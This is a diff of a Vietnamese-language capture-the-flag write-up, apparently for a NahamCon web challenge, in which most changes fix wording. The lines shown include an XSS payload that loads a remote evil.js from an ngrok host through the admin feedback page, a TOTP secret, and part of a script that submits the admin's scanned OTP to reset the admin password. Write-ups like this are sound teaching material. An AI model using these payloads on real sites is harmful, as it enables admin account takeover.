@@ -21,9 +21,7 @@ http://challenge.nahamcon.com:31169/reset2fa
 {"url":"otpauth://totp/Fort%20Knox:2?secret=VOEJIF5EA7UDKTAS&issuer=Fort%20Knox"}
 ```
 
-+ Phần feedback dính lỗi XSS từ phía admin, trigger bằng cách đơn giản: 
-
-<scirpt src="http://e405-42-112-56-248.ngrok.io/evil.js"></scirpt>
++ Phần feedback dính lỗi XSS từ phía admin, triger để test đơn giản: <scirpt src="http://e405-42-112-56-248.ngrok.io/evil.js"></scirpt>
 
 ![setting](https://user-images.githubusercontent.com/71699412/167260883-9d76f2d0-b2cd-4469-8037-2896aff45b28.jpg)
 
@@ -83,7 +81,7 @@ xhr.onload = function() {
 	exit.send();
 };
 
-// OPT vừa scan từ QR code của admin
+// OTP vừa scan từ QR code của admin
 xhr.send(JSON.stringify({"otp":"786746","password":"admin","password2":"admin"}));
 ```
 GET /?status=eyJzdWNjZXNzIjp0cnVlfQo= ==> `{"success":true}`
